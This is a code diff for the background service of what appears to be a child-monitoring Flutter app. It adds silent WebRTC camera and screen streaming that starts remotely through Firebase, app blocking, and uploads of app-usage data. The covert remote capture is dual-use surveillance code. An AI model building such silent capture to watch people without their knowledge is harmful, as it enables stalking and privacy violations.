@@ -8,6 +8,7 @@ import 'package:flutter_background_service/flutter_background_service.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:usage_stats/usage_stats.dart';
 import 'device_event_service.dart';
+import 'silent_webrtc_service.dart';
 
 const String _kUidKey              = 'child_uid';
 const String _kWizardKey           = 'wizard_done';
@@ -131,6 +132,13 @@ void _onStart(ServiceInstance service) async {
     }
   }
 
+  // FIX-04: Enable offline persistence so Firebase RTDB survives brief
+  // network gaps without dropping listeners. Must be called once before
+  // any FirebaseDatabase reference is created.
+  try {
+    FirebaseDatabase.instance.setPersistenceEnabled(true);
+  } catch (_) {}
+
   // ── UID guard ──────────────────────────────────────────
   final prefs = await SharedPreferences.getInstance();
   final uid   = prefs.getString(_kUidKey);
@@ -221,6 +229,7 @@ void _onStart(ServiceInstance service) async {
 
 StreamSubscription? _connectedSub;
 StreamSubscription? _callsSub;
+StreamSubscription? _appLocksSub;
 Timer? _heartbeatTimer;
 Timer? _pingTimer;
 Timer? _watchdogTimer;
@@ -231,10 +240,14 @@ Timer? _screenTimeTimer;
 void _cancelSessionResources() {
   _connectedSub?.cancel();    _connectedSub    = null;
   _callsSub?.cancel();        _callsSub        = null;
+  _appLocksSub?.cancel();     _appLocksSub     = null;
   _heartbeatTimer?.cancel();  _heartbeatTimer  = null;
   _pingTimer?.cancel();       _pingTimer       = null;
   _watchdogTimer?.cancel();   _watchdogTimer   = null;
   _screenTimeTimer?.cancel(); _screenTimeTimer = null;
+  // FIX-01: Stop WebRTC in this isolate. stopSilent() sets _active=false
+  // synchronously — the async teardown is fire-and-forget safe.
+  SilentWebRTCService.instance.stopSilent().catchError((_) {});
 }
 
 /// Sets up all Firebase listeners and periodic timers for a monitoring session.
@@ -251,11 +264,16 @@ Future<void> _setupMonitoringSession(
   await FirebaseDatabase.instance.ref('users/$uid/isOnline').set(true);
   await FirebaseDatabase.instance.ref('users/$uid/lastSeen').set(ServerValue.timestamp);
 
-  // Mark online / offline via .info/connected
+  // FIX-03: Register onDisconnect for users/$uid/isOnline here, in the
+  // background isolate. Firebase executes onDisconnect server-side when the
+  // socket closes, so this is reliable even if the client process is killed.
   _connectedSub = FirebaseDatabase.instance.ref('.info/connected').onValue.listen((event) async {
     final connected = event.snapshot.value as bool? ?? false;
     if (connected) {
       try {
+        final userRef = FirebaseDatabase.instance.ref('users/$uid');
+        await userRef.child('isOnline').onDisconnect().set(false);
+        await userRef.child('isOnline').set(true);
         final statusRef = FirebaseDatabase.instance.ref('calls/$uid/status');
         await statusRef.onDisconnect().set('offline');
         await statusRef.set('online');
@@ -292,12 +310,15 @@ Future<void> _setupMonitoringSession(
     } catch (_) {}
   });
 
-  // Watch for call state changes
+  // FIX-01: Drive WebRTC directly in this background isolate.
+  // DartPluginRegistrant.ensureInitialized() at the top of _onStart gives
+  // this isolate full plugin access, so flutter_webrtc's getUserMedia works
+  // here without needing to relay through the UI isolate via service.invoke.
   _callsSub = FirebaseDatabase.instance.ref('calls/$uid').onValue.listen((event) {
     final data = event.snapshot.value;
     if (data == null || data is! Map) {
       if (streamActive) {
-        service.invoke('silent_stop');
+        SilentWebRTCService.instance.stopSilent().catchError((_) {});
         streamActive = false;
         activeMode   = null;
       }
@@ -321,15 +342,48 @@ Future<void> _setupMonitoringSession(
 
     if (status == 'calling') {
       if (!streamActive || activeMode != mode) {
-        if (streamActive) service.invoke('silent_stop');
+        if (streamActive) SilentWebRTCService.instance.stopSilent().catchError((_) {});
         streamActive = true;
         activeMode   = mode;
-        service.invoke('silent_stream', {'uid': uid, 'mode': mode});
+        if (mode == 'screen') {
+          SilentWebRTCService.instance.startSilentScreen(uid).catchError((_) {});
+        } else {
+          SilentWebRTCService.instance.startSilentCamera(uid).catchError((_) {});
+        }
       }
     } else if (status == 'ended') {
-      service.invoke('silent_stop');
+      SilentWebRTCService.instance.stopSilent().catchError((_) {});
       streamActive = false;
       activeMode   = null;
+    }
+  });
+
+  // FIX-02: Sync blocked packages to SharedPreferences so the native
+  // AppBlockAccessibilityService can read them without hitting Firebase.
+  // The key "blocked_packages" is stored with Flutter's "flutter." prefix
+  // by SharedPreferences, readable in Kotlin as "flutter.blocked_packages".
+  _appLocksSub = FirebaseDatabase.instance.ref('app_locks/$uid').onValue.listen((event) async {
+    try {
+      final raw = event.snapshot.value;
+      final blocked = <String>[];
+      if (raw is Map) {
+        for (final entry in (raw as Map).entries) {
+          final pkg = entry.key as String?;
+          if (pkg != null && pkg.isNotEmpty && !pkg.startsWith('_')) {
+            final data = entry.value;
+            final isBlocked = data is Map
+                ? ((data as Map)['blocked'] as bool? ?? true)
+                : true;
+            if (isBlocked) blocked.add(pkg);
+          }
+        }
+      }
+      // Use a fresh SharedPreferences instance — `prefs` is local to _onStart.
+      final sp = await SharedPreferences.getInstance();
+      await sp.setString('blocked_packages', blocked.join(','));
+      debugPrint('[BgService] Synced ${blocked.length} blocked packages to SharedPreferences');
+    } catch (e) {
+      debugPrint('[BgService] app_locks sync error: $e');
     }
   });
 
@@ -390,6 +444,30 @@ Future<void> _setupMonitoringSession(
           }
         }
       }
+
+      // FIX-14: Upload today's full usage snapshot to Firebase so the parent
+      // dashboard can display per-app screen time without a separate sync request.
+      try {
+        final usageSnap = <String, dynamic>{
+          '_date':      now.toIso8601String().substring(0, 10),
+          '_updatedAt': DateTime.now().millisecondsSinceEpoch,
+        };
+        for (final stat in stats) {
+          final pkg = stat.packageName;
+          if (pkg == null) continue;
+          final usedMs = int.tryParse(stat.totalTimeInForeground ?? '0') ?? 0;
+          if (usedMs > 60000) {
+            // Firebase keys cannot contain dots — replace with underscores.
+            final key = pkg.replaceAll('.', '_');
+            usageSnap[key] = {
+              'pkg':         pkg,
+              'usedMs':      usedMs,
+              'usedMinutes': usedMs ~/ 60000,
+            };
+          }
+        }
+        await FirebaseDatabase.instance.ref('app_usage/$uid/daily').set(usageSnap);
+      } catch (_) {}
     } catch (e) {
       debugPrint('[BgService] Screen time check error: $e');
     }
